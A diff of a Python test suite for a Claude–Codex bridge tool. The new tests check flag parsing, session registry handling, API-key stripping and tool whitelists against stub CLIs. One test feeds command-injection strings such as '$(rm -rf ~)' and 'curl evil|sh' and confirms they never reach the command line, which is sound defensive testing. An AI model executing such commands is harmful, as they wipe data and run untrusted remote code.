@@ -1,14 +1,17 @@
 from __future__ import annotations
 
 import json
+import os
+import shutil
 import subprocess
-import sys
+import tempfile
 import unittest
 from pathlib import Path
 
 
 ROOT = Path(__file__).resolve().parents[1]
 BRIDGE = ROOT / "claude-codex-bridge"
+SCRIPT = BRIDGE / "plugins" / "cx" / "bridge" / "bridge.ts"
 
 CX_COMMANDS = (
     BRIDGE / "plugins/cx/commands/ask.md",
@@ -22,166 +25,235 @@ CC_PROMPTS = (
     BRIDGE / "codex-prompts/cc-resume.md",
 )
 
-# The write-capable task tool whitelist must stay identical wherever a task can
-# run (fresh task and resumed task), or a resumed session silently loses or
-# gains permissions relative to the session that created it.
-TASK_ALLOWED_TOOLS = (
-    "Read,Edit,Write,Grep,Glob,Bash(git status *),Bash(git diff *),"
-    "Bash(npm test *),Bash(npm run *),Bash(pnpm test *),Bash(pnpm run *),"
-    "Bash(yarn test *),Bash(yarn run *),Bash(bun test *),Bash(deno test *),"
-    "Bash(pytest *),Bash(python -m pytest *),Bash(uv run pytest *),"
-    "Bash(go test *),Bash(cargo test *),Bash(mvn test *),Bash(mvn verify *),"
-    "Bash(gradle test *),Bash(gradlew test *),Bash(dotnet test *),"
-    "Bash(make test *),Bash(bundle exec rspec *),Bash(rspec *)"
-)
+BUN = shutil.which("bun")
 
-REPO_HASH_RULE = (
-    "first 16 lowercase hex characters of the SHA-256 of the absolute repository path"
-)
+CODEX_STUB = """#!/bin/sh
+printf '%s\\n' "$@" > "$STUB_DIR/codex-argv.txt"
+cat > "$STUB_DIR/codex-stdin.txt"
+prev=""; out=""
+for a in "$@"; do [ "$prev" = "-o" ] && out="$a"; prev="$a"; done
+[ -n "$out" ] && printf 'codex answer\\n' > "$out"
+printf '{"type":"session.created","session_id":"aaaabbbb-cccc-4ddd-8eee-ffff00001111"}\\n'
+"""
+
+CLAUDE_STUB = """#!/bin/sh
+printf '%s\\n' "$@" > "$STUB_DIR/claude-argv.txt"
+cat > "$STUB_DIR/claude-stdin.txt"
+if [ -n "$ANTHROPIC_API_KEY" ]; then echo leaked > "$STUB_DIR/apikey-leak.txt"; fi
+printf '{"result":"claude answer","session_id":"99998888-7777-4666-8555-444433332222","total_cost_usd":0.0712,"is_error":false}\\n'
+"""
 
 
 def read(path: Path) -> str:
     return path.read_text(encoding="utf-8")
 
 
-def normalized_lines(text: str) -> list[str]:
-    return [line.strip() for line in text.splitlines() if line.strip()]
+@unittest.skipUnless(BUN, "bun is required to test bridge.ts")
+@unittest.skipIf(os.name == "nt", "stub executables are POSIX shell scripts")
+class BridgeScriptTest(unittest.TestCase):
+    """Integration tests: run the real script against stub codex/claude CLIs."""
 
-
-def task_contract_block(text: str) -> list[str]:
-    """Extract the shared completeness/verification/action_safety contract,
-    indentation-normalized, so the three copies can be compared verbatim."""
-    start = text.index("<completeness_contract>")
-    end = text.index("</action_safety>") + len("</action_safety>")
-    return normalized_lines(text[start:end])
-
-
-class BridgeContractsTest(unittest.TestCase):
-    def test_generic_task_contract_is_byte_identical_across_copies(self) -> None:
-        # README design rule "task 合同通用": same done-standard, verification
-        # loop, and action-safety boundary for /cx:task, the codex-prompting
-        # skill, and /cc-task. Drift in any copy breaks that invariant silently.
-        skill = read(BRIDGE / "plugins/cx/skills/codex-prompting/SKILL.md")
-        # SKILL.md names the block twice (a description table and the canonical
-        # code block); compare against the canonical "Generic Task Contract" copy.
-        skill_canonical = skill[skill.index("## Generic Task Contract") :]
-        texts = {
-            "task.md": read(BRIDGE / "plugins/cx/commands/task.md"),
-            "SKILL.md": skill_canonical,
-            "cc-task.md": read(BRIDGE / "codex-prompts/cc-task.md"),
+    def setUp(self) -> None:
+        self.tmp = Path(tempfile.mkdtemp(prefix="bridge-test-"))
+        self.addCleanup(shutil.rmtree, self.tmp, True)
+        self.repo = self.tmp / "repo"
+        self.repo.mkdir()
+        bin_dir = self.tmp / "bin"
+        bin_dir.mkdir()
+        for name, body in (("codex", CODEX_STUB), ("claude", CLAUDE_STUB)):
+            stub = bin_dir / name
+            stub.write_text(body, encoding="utf-8")
+            stub.chmod(0o755)
+        self.env = {
+            **os.environ,
+            "PATH": f"{bin_dir}:{os.environ['PATH']}",
+            "XDG_STATE_HOME": str(self.tmp / "state"),
+            "STUB_DIR": str(self.tmp),
+            "ANTHROPIC_API_KEY": "sk-test-must-not-leak",
         }
-        blocks = {name: task_contract_block(text) for name, text in texts.items()}
-        baseline = blocks["task.md"]
-        for name, block in blocks.items():
-            self.assertEqual(baseline, block, f"task contract drifted in {name}")
 
-    def test_task_whitelist_identical_for_fresh_and_resumed_tasks(self) -> None:
-        for path in (
-            BRIDGE / "codex-prompts/cc-task.md",
-            BRIDGE / "codex-prompts/cc-resume.md",
-        ):
-            with self.subTest(path=path.name):
-                self.assertIn(TASK_ALLOWED_TOOLS, read(path))
-
-    def test_billing_guard_is_baked_into_every_cc_command_template(self) -> None:
-        # The guard must live in the runnable command, not only in prose, so a
-        # literal "follow exactly" execution cannot bill the API key.
-        for path in CC_PROMPTS:
-            text = read(path)
-            with self.subTest(path=path.name):
-                self.assertIn("env -u ANTHROPIC_API_KEY", text)
-                self.assertIn("$env:ANTHROPIC_API_KEY = $null", text)
-
-    def test_every_cc_command_forbids_billing_breaking_flags(self) -> None:
-        for path in CC_PROMPTS:
-            text = read(path)
-            with self.subTest(path=path.name):
-                self.assertIn("Never pass `--bare`", text)
-                self.assertIn("never use `--continue`", text)
-
-    def test_repo_hash_algorithm_pinned_wherever_the_hash_is_used(self) -> None:
-        for path in (
-            BRIDGE / "plugins/cx/commands/task.md",
-            BRIDGE / "codex-prompts/cc-ask.md",
-            BRIDGE / "codex-prompts/cc-task.md",
-            BRIDGE / "codex-prompts/cc-review.md",
-            BRIDGE / "codex-prompts/cc-resume.md",
-        ):
-            with self.subTest(path=path.name):
-                self.assertIn(REPO_HASH_RULE, read(path))
-
-    def test_flag_values_are_shape_checked_before_the_host_command_line(self) -> None:
-        # Prompt bodies travel via stdin; flag values land on the host command
-        # line. Every file that splices a value must carry its shape check, or
-        # `--model "$(...)"` style input executes on the host.
-        expectations = {
-            "plugins/cx/commands/ask.md": ("[A-Za-z0-9._-]+",),
-            "plugins/cx/commands/task.md": ("[A-Za-z0-9._-]+", "UUID-shaped"),
-            "plugins/cx/commands/review.md": ("[A-Za-z0-9._/-]+", "[0-9a-fA-F]{4,40}"),
-            "codex-prompts/cc-ask.md": ("[A-Za-z0-9._-]+",),
-            "codex-prompts/cc-task.md": ("[A-Za-z0-9._-]+",),
-            "codex-prompts/cc-review.md": ("[A-Za-z0-9._-]+", "[A-Za-z0-9._/-]+"),
-            "codex-prompts/cc-resume.md": ("[A-Za-z0-9._-]+", "UUID-shaped"),
-        }
-        for rel, markers in expectations.items():
-            text = read(BRIDGE / rel)
-            for marker in markers:
-                with self.subTest(path=rel, marker=marker):
-                    self.assertIn(marker, text)
-
-    def test_heredoc_collision_guard_on_every_cx_stdin_path(self) -> None:
-        for path in CX_COMMANDS:
-            with self.subTest(path=path.name):
-                self.assertIn("collision guard", read(path))
-
-    def test_cc_registry_filenames_named_by_every_writer_and_reader(self) -> None:
-        for name in ("cc-ask.md", "cc-task.md", "cc-review.md", "cc-resume.md"):
-            text = read(BRIDGE / "codex-prompts" / name)
-            with self.subTest(path=name):
-                self.assertIn("cc-sessions.json", text)
-                self.assertIn("cc-last-session.json", text)
-
-    def test_generated_files_match_generator_output(self) -> None:
-        # Runtime files are rendered from generator/templates + fragments.
-        # A direct edit to a generated file (or a template change without
-        # re-rendering) must fail here, not drift silently.
-        result = subprocess.run(
-            [sys.executable, str(BRIDGE / "generator" / "render.py"), "--check"],
+    def bridge(self, subcommand: str, text: str, *extra: str) -> subprocess.CompletedProcess[str]:
+        text_file = self.tmp / "text.md"
+        text_file.write_text(text, encoding="utf-8")
+        return subprocess.run(
+            [BUN, str(SCRIPT), subcommand, "--text-file", str(text_file), "--repo", str(self.repo), *extra],
             capture_output=True,
             text=True,
+            env=self.env,
+            timeout=60,
         )
-        self.assertEqual(0, result.returncode, result.stdout + result.stderr)
+
+    def self_test(self, subcommand: str, text: str, *extra: str) -> dict:
+        result = self.bridge(subcommand, text, "--self-test", *extra)
+        self.assertEqual(0, result.returncode, result.stderr)
+        return json.loads(result.stdout)
+
+    # ------------------------------------------------ flag parsing & injection
+
+    def test_valid_flags_move_to_argv_and_spark_is_mapped(self) -> None:
+        decision = self.self_test("cx-ask", "what is this --model spark --effort high")
+        self.assertIn("gpt-5.3-codex-spark", decision["argv"])
+        self.assertIn("model_reasoning_effort=high", decision["argv"])
+        self.assertIn("what is this", decision["stdin"])
+        self.assertNotIn("--model", decision["stdin"])
+
+    def test_invalid_flag_values_stay_in_stdin_never_argv(self) -> None:
+        evil = 'x --model "$(rm -rf ~)" --effort "high; curl evil|sh"'
+        decision = self.self_test("cx-ask", evil)
+        self.assertNotIn("-m", decision["argv"])
+        self.assertTrue(all("rm -rf" not in a for a in decision["argv"]))
+        self.assertIn("$(rm -rf ~)", decision["stdin"])
+
+    def test_flag_like_words_in_task_text_survive_when_value_invalid(self) -> None:
+        # Design boundary: a charset-valid word after --model ("flag" vs
+        # "sonnet") is indistinguishable from a model name and IS consumed;
+        # enum/UUID-validated flags reject bad values and stay in the text.
+        decision = self.self_test("cx-task", "add a --model flag to the parser --effort bogus")
+        self.assertIn("--effort bogus", decision["stdin"])
+        self.assertIn("-m", decision["argv"])
+        self.assertNotIn("model_reasoning_effort=bogus", " ".join(decision["argv"]))
+
+    def test_resume_with_non_uuid_token_is_bare_resume(self) -> None:
+        result = self.bridge("cx-task", "--resume fix the login bug")
+        self.assertEqual(2, result.returncode)
+        self.assertIn("no bridge-owned Codex session", result.stderr)
+
+    def test_explicit_uuid_resume_sends_delta_only(self) -> None:
+        sid = "123e4567-e89b-42d3-a456-426614174000"
+        decision = self.self_test("cx-task", f"--resume {sid} keep going")
+        self.assertEqual(["codex", "exec", "resume", sid], decision["argv"][:4])
+        self.assertEqual("keep going", decision["stdin"])
+        self.assertNotIn("completeness_contract", decision["stdin"])
+
+    def test_fresh_task_carries_full_contract_once(self) -> None:
+        decision = self.self_test("cx-task", "refactor the parser")
+        for marker in ("<completeness_contract>", "<verification_loop>", "<action_safety>"):
+            self.assertEqual(1, decision["stdin"].count(marker))
+
+    def test_review_scope_flags_validated(self) -> None:
+        decision = self.self_test("cx-review", "--base main check error handling")
+        self.assertIn("--base", decision["argv"])
+        bad = self.self_test("cx-review", "--base 'main;rm' check stuff")
+        self.assertIn("--uncommitted", bad["argv"])
+        self.assertNotIn("--base", bad["argv"])
+
+    # ----------------------------------------------------- registry round-trip
+
+    def test_fresh_run_records_session_and_follow_up_resumes_it(self) -> None:
+        first = self.bridge("cx-task", "do the thing")
+        self.assertEqual(0, first.returncode, first.stderr)
+        self.assertEqual("codex answer\n", first.stdout)
+        second = self.bridge("cx-task", "keep going", "--follow-up")
+        self.assertEqual(0, second.returncode, second.stderr)
+        argv = read(self.tmp / "codex-argv.txt").split()
+        self.assertIn("resume", argv)
+        self.assertIn("aaaabbbb-cccc-4ddd-8eee-ffff00001111", argv)
+
+    def test_corrupted_registry_is_rebuilt_not_crashed(self) -> None:
+        state = Path(self.env["XDG_STATE_HOME"]) / "claude-codex-bridge" / "sessions"
+        first = self.bridge("cc-ask", "warm up the registry")
+        self.assertEqual(0, first.returncode, first.stderr)
+        for f in state.rglob("cc-sessions.json"):
+            f.write_text("{not json", encoding="utf-8")
+        again = self.bridge("cc-ask", "second question")
+        self.assertEqual(0, again.returncode, again.stderr)
+
+    def test_cc_resume_inherits_recorded_mode(self) -> None:
+        self.bridge("cc-ask", "first question")
+        result = self.bridge("cc-resume", "and a follow-up")
+        self.assertEqual(0, result.returncode, result.stderr)
+        argv = read(self.tmp / "claude-argv.txt")
+        self.assertIn("--resume\n99998888-7777-4666-8555-444433332222", argv)
+        self.assertIn("Read,Grep,Glob", argv)
+        self.assertNotIn("acceptEdits", argv)
+
+    def test_cc_resume_unknown_session_requires_mode(self) -> None:
+        result = self.bridge("cc-resume", "follow-up --session 00000000-0000-4000-8000-000000000000")
+        self.assertEqual(2, result.returncode)
+        self.assertIn("--mode ask|review|task", result.stderr)
+
+    # ------------------------------------------------------- claude mechanics
+
+    def test_billing_guard_strips_api_key_from_child(self) -> None:
+        result = self.bridge("cc-ask", "does the key leak?")
+        self.assertEqual(0, result.returncode, result.stderr)
+        self.assertFalse((self.tmp / "apikey-leak.txt").exists())
+
+    def test_cc_output_ends_with_cost_and_session_line(self) -> None:
+        result = self.bridge("cc-ask", "hello")
+        self.assertEqual(0, result.returncode, result.stderr)
+        self.assertIn("claude answer", result.stdout)
+        self.assertIn("cost: $0.07 | session: 99998888-7777-4666-8555-444433332222", result.stdout)
+
+    def test_cc_task_uses_accept_edits_and_whitelist(self) -> None:
+        decision = self.self_test("cc-task", "fix the bug")
+        argv = decision["argv"]
+        self.assertIn("acceptEdits", argv)
+        self.assertTrue(any("Bash(make test *)" in a for a in argv), argv)
+        self.assertTrue(decision["billingGuard"])
+
+    def test_cc_review_base_flag_sets_scope_deterministically(self) -> None:
+        decision = self.self_test("cc-review", "--base develop check the auth changes")
+        self.assertIn("git diff develop...HEAD", decision["stdin"])
+        self.assertIn("check the auth changes", decision["stdin"])
+
+
+class MarkdownShellTest(unittest.TestCase):
+    """The markdown layer must stay a thin intent shell around bridge.ts."""
+
+    def test_cx_commands_invoke_bridge_and_disable_model_invocation(self) -> None:
+        for path in CX_COMMANDS:
+            text = read(path)
+            with self.subTest(path=path.name):
+                self.assertIn('bun "${CLAUDE_PLUGIN_ROOT}/bridge/bridge.ts"', text)
+                self.assertIn("disable-model-invocation: true", text)
+                self.assertIn("Write tool", text)
+
+    def test_cc_prompts_invoke_bridge_on_both_shells(self) -> None:
+        for path in CC_PROMPTS:
+            text = read(path)
+            with self.subTest(path=path.name):
+                self.assertIn('bun "$HOME/.codex/bridge/bridge.ts"', text)
+                self.assertIn("bun \"$env:USERPROFILE\\.codex\\bridge\\bridge.ts\"", text)
+
+    def test_no_retry_no_fallback_in_every_shell(self) -> None:
+        for path in (*CX_COMMANDS, *CC_PROMPTS):
+            with self.subTest(path=path.name):
+                self.assertIn("Do not retry", read(path))
+
+    def test_mechanical_content_lives_in_script_not_markdown(self) -> None:
+        # Contract blocks, tool whitelists, and registry paths must exist only
+        # in bridge.ts; markdown copies would reintroduce the drift problem.
+        script = read(SCRIPT)
+        self.assertIn("<completeness_contract>", script)
+        self.assertIn("Bash(make test *)", script)
+        for path in (*CX_COMMANDS, *CC_PROMPTS):
+            text = read(path)
+            with self.subTest(path=path.name):
+                self.assertNotIn("completeness_contract", text)
+                self.assertNotIn("Bash(make test *)", text)
+                self.assertNotIn("ANTHROPIC_API_KEY", text)
+
+
+class PackagingTest(unittest.TestCase):
+    def test_manifests_consistent(self) -> None:
+        marketplace = json.loads(read(BRIDGE / ".claude-plugin/marketplace.json"))
+        plugin = json.loads(read(BRIDGE / "plugins/cx/.claude-plugin/plugin.json"))
+        self.assertEqual("cx", plugin["name"])
+        self.assertIn(plugin["name"], {p["name"] for p in marketplace["plugins"]})
+
+    def test_installers_deploy_bridge_script_and_warn_without_bun(self) -> None:
+        sh = read(BRIDGE / "install.sh")
+        ps1 = read(BRIDGE / "install.ps1")
+        for text in (sh, ps1):
+            self.assertIn("bridge.ts", text)
+            self.assertIn("bun", text)
+        self.assertIn(".codex/bridge", sh)
+        self.assertIn(".codex\\bridge", ps1)
 
     def test_installers_preserve_the_first_backup(self) -> None:
         self.assertIn('[ ! -e "$target.bak" ]', read(BRIDGE / "install.sh"))
         self.assertIn('-not (Test-Path "$target.bak")', read(BRIDGE / "install.ps1"))
-
-    def test_resume_uses_explicit_session_id_not_last_shortcut(self) -> None:
-        task = read(BRIDGE / "plugins/cx/commands/task.md")
-        self.assertIn("never use `--last`", task)
-        resume = read(BRIDGE / "codex-prompts/cc-resume.md")
-        self.assertIn("claude --print --resume", resume)
-        self.assertNotIn("--continue", resume.replace("never use `--continue`", ""))
-
-    def test_cx_commands_disable_model_invocation(self) -> None:
-        for path in CX_COMMANDS:
-            with self.subTest(path=path.name):
-                self.assertIn("disable-model-invocation: true", read(path))
-
-    def test_plugin_and_marketplace_manifests_are_consistent_json(self) -> None:
-        marketplace = json.loads(read(BRIDGE / ".claude-plugin/marketplace.json"))
-        plugin = json.loads(read(BRIDGE / "plugins/cx/.claude-plugin/plugin.json"))
-        self.assertEqual("cx", plugin["name"])
-        plugin_names = {entry["name"] for entry in marketplace["plugins"]}
-        self.assertIn(plugin["name"], plugin_names)
-
-    def test_installers_remove_stale_legacy_prompts(self) -> None:
-        legacy = ("claude-ask.md", "claude-review.md", "claude-task.md", "claude-resume.md")
-        for installer in ("install.sh", "install.ps1"):
-            text = read(BRIDGE / installer)
-            for name in legacy:
-                with self.subTest(installer=installer, prompt=name):
-                    self.assertIn(name, text)
 
 
 if __name__ == "__main__":
